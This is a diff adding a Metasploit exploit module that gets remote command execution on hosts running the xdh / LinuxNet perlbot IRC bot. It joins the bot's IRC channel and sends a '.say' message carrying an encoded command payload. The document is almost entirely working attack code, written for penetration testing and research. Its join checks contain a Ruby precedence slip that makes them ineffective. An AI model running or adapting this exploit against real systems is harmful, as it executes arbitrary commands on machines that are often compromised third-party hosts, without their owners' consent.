@@ -1,0 +1,171 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution',
+      'Description'    => %q{
+          This module allows remote command execution on an IRC Bot developed by xdh.
+          This perl bot was caught by Conor Patrick with his shellshock honeypot server
+          and is categorized by Markus Zanke as an fBot (Fire & Forget - DDoS Bot). Matt
+          Thayer also found this script which has a description of LinuxNet perlbot.
+
+          The bot answers only based on the servername and nickname in the IRC message
+          which is configured on the perl script thus you need to be an operator on the IRC
+          network to spoof it and in order to exploit this bot or have at least the same ip
+          to the config.
+        },
+      'Author'         =>
+        [
+          #MalwareMustDie
+          'Jay Turla', # msf
+          'Conor Patrick', # initial discovery and botnet analysis for xdh
+          'Matt Thayer' # initial discovery for LinuxNet perlbot
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'URL', 'https://conorpp.com/blog/a-close-look-at-an-operating-botnet/' ],
+          [ 'URL', 'https://twitter.com/MrMookie/status/673389285676965889' ], # Matt's discovery
+          [ 'URL', 'https://www.alienvault.com/open-threat-exchange/blog/elasticzombie-botnet-exploiting-elasticsearch-vulnerabilities' ] # details of what an fBot is
+        ],
+      'Platform'       => %w{ unix win },
+      'Arch'           => ARCH_CMD,
+      'Payload'        =>
+        {
+          'Space'    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf
+          'DisableNops' => true,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd'
+            }
+        },
+      'Targets'  =>
+        [
+          [ 'xdh Botnet / LinuxNet perlbot', { } ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Dec 04 2015',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        Opt::RPORT(6667),
+        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),
+        OptString.new('NICK', [true, 'IRC Nickname', 'msfuser']), # botnet administrator name
+        OptString.new('CHANNEL', [true, 'IRC Channel', '#channel'])
+      ], self.class)
+  end
+
+  def check
+    connect
+
+    res = register(sock)
+    if res =~ /463/ || res =~ /464/
+      vprint_error("#{rhost}:#{rport}  - Connection to the IRC Server not allowed")
+      return Exploit::CheckCode::Unknown
+    end
+
+    res = join(sock)
+    if !res =~ /353/ && !res =~ /366/
+      vprint_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
+      return Exploit::CheckCode::Unknown
+    end
+
+    quit(sock)
+    disconnect
+
+    if res =~ /auth/ && res =~ /logged in/
+      Exploit::CheckCode::Vulnerable
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def send_msg(sock, data)
+    sock.put(data)
+    data = ""
+    begin
+      read_data = sock.get_once(-1, 1)
+      while !read_data.nil?
+        data << read_data
+        read_data = sock.get_once(-1, 1)
+      end
+    rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+    end
+
+    data
+  end
+
+  def register(sock)
+    msg = ""
+
+    if datastore['IRC_PASSWORD'] && !datastore['IRC_PASSWORD'].empty?
+      msg << "PASS #{datastore['IRC_PASSWORD']}\r\n"
+    end
+
+    if datastore['NICK'].length > 9
+      nick = rand_text_alpha(9)
+      print_error("The nick is longer than 9 characters, using #{nick}")
+    else
+      nick = datastore['NICK']
+    end
+
+    msg << "NICK #{nick}\r\n"
+    msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"
+
+    send_msg(sock,msg)
+  end
+
+  def join(sock)
+    join_msg = "JOIN #{datastore['CHANNEL']}\r\n"
+    send_msg(sock, join_msg)
+  end
+
+  def xdh_command(sock)
+    encoded = payload.encoded
+    command_msg = "PRIVMSG #{datastore['CHANNEL']} :.say #{encoded}\r\n"
+    send_msg(sock, command_msg)
+  end
+
+  def quit(sock)
+    quit_msg = "QUIT :bye bye\r\n"
+    sock.put(quit_msg)
+  end
+
+  def exploit
+    connect
+
+    print_status("#{rhost}:#{rport} - Registering with the IRC Server...")
+    res = register(sock)
+    if res =~ /463/ || res =~ /464/
+      print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
+      return
+    end
+
+    print_status("#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...")
+    res = join(sock)
+    if !res =~ /353/ && !res =~ /366/
+      print_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
+      return
+    end
+
+    print_status("#{rhost}:#{rport} - Exploiting the malicious IRC bot...")
+    xdh_command(sock)
+
+    quit(sock)
+    disconnect
+  end
+
+end
